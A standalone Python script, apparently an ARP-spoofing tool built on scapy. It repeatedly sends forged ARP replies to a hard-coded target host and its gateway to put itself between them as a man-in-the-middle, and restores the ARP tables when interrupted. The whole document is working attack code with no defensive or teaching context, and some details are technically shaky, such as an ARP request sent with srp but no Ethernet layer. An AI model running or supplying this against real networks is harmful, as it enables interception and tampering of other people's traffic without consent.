import socket
import struct
from scapy.all import *
import time

def spoof_ip(target_ip, spoof_ip):
    # Create an ARP packet
    arp_response = ARP(op=2, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=spoof_ip)
    
    # Send the packet out the network interface
    send(arp_response, verbose=False)

def get_mac(ip):
    # Create an ARP request
    arp_request = ARP(pdst=ip)
    
    # Send the request and receive the response
    answered, unanswered = srp(arp_request, timeout=2, retry=10)
    
    # Return the MAC address if available
    return next((sent_pkt[ARP].hwsrc for sent_pkt in answered), None)

def restore(destination_ip, source_ip):
    # Get the MAC address of the destination IP
    destination_mac = get_mac(destination_ip)
    
    # Create an ARP response to restore communication
    arp_response = ARP(op=2, pdst=source_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=destination_ip, hwsrc=destination_mac)
    
    # Send the packet out the network interface
    send(arp_response, verbose=False)

# Set the target IP and gateway IP addresses
target_ip = "192.168.1.10"
gateway_ip = "192.168.1.1"
sent_packets_count = 0

try:
    while True:
        # Spoof the target IP
        spoof_ip(target_ip, gateway_ip)
        
        # Spoof the gateway IP (for a double-blind attack)
        spoof_ip(gateway_ip, target_ip)
        
        # Increment the sent packets count
        sent_packets_count += 1
        
        # Wait before sending another packet
        time.sleep(2)
except KeyboardInterrupt:
    print("Restoring the network...")
    
    # Restore the original MAC addresses of the target and gateway IPs
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
    
    print(f"Total packets sent: {sent_packets_count}")